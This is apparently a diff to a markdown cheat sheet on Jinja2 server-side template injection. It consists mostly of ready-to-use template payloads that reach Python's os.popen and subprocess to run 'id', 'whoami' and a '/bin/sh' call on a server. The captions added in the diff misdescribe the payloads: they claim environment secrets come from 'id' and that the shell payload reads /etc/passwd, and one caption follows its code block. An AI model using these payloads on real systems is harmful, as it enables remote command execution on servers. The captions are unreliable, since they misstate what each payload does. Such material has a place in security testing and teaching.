@@ -72,10 +72,17 @@ If the app is running in debug mode, execute system commands:
 ```jinja2
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
+This may return system environment variables like SECRET_KEY, DB_PASSWORD, or API keys.
 or  
 ```jinja2
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh', shell=True, stdout=-1).communicate()[0] }}
 ```
+Reads the /etc/passwd file on Linux (check for usernames).
+
+```jinja2
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
+```
+Execute `whoami` to reveal the current user:
 
 ---
 
